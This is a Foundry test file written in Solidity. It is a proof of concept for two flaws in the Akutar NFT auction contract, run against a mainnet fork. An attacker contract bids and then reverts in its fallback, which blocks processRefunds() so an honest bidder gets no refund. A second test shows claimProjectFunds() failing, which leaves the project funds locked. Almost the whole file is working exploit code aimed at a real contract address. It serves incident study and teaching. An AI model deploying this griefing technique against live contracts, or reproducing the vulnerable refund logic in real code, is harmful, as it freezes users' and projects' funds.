// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
Akutar NFT Denial of Service(DoS) Exploit PoC

There are two serious logic vulnerabilities

1. First can cause a DoS attack due to the missing check if the bidder is a contract. As a result, the attacker can call the revert() and stop the honest bidders from getting back their bid amount.

2. The Second will make the project fund (more than 34M USD) being locked forever due to incorrect check in the require statement.

forge test --contracts ./src/test/AkutarNFT_exp.sol -vv  
*/

interface IAkutarNFT {

    function processRefunds() external;

    function bid(uint8 amount) external payable;

    function claimProjectFunds() external;

}

contract AkutarNFTExploit is Test {

    IAkutarNFT akutarNft = IAkutarNFT(0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d);

    function setUp() public {
        vm.createSelectFork("mainnet", 14_636_844); // fork mainnet at 14636844
    }

    function testDOSAttack() public {
        address honestUser = 0xca2eB45533a6D5E2657382B0d6Ec01E33a425BF4;
        address maliciousUser = address(this); // malicious User is a contract address

        vm.prank(maliciousUser); //maliciousUser makes a bid
        akutarNft.bid{value: 3.5 ether}(1);
        console.log("honestUser Balance before Bid: ", honestUser.balance / 1 ether);

        vm.prank(honestUser); //honestUser makes a bid
        akutarNft.bid{value: 3.75 ether}(1);
        console.log("honestUser Balance after Bid: ", honestUser.balance / 1 ether);

        //Set the block.height to the time when the auction was over and processRefunds() can be invoked
        //https://etherscan.io/tx/0x62d280abc60f8b604175ab24896c989e6092e496ac01f2f5399b2a62e9feaacf
        //use - https://www.epochconverter.com/ for UTC <-> epoch
        vm.warp(1_650_674_809);

        vm.prank(maliciousUser);
        try akutarNft.processRefunds() {}
        catch Error(string memory Exception) {
            console.log("processRefunds() REVERT : ", Exception);
        }
        //Since the honestUser's bid was after maliciousUser's bid, the bid amount of the honestUser is never returned due to the revert Exception
        console.log("honestUser Balance post processRefunds: ", honestUser.balance / 1 ether);
    }

    function testclaimProjectFunds() public {
        address ownerOfAkutarNFT = 0xCc0eCD808Ce4fEd81f0552b3889656B28aa2BAe9;

        //Set the block.height to the time when the auction was over and claimProjectFunds() can be invoked
        vm.warp(1_650_672_435);

        vm.prank(ownerOfAkutarNFT);
        try akutarNft.claimProjectFunds() {}
        catch Error(string memory Exception) {
            console.log("claimProjectFunds() ERROR : ", Exception);
        }
    }

    fallback() external {
        revert("CAUSE REVERT !!!");
    }

}
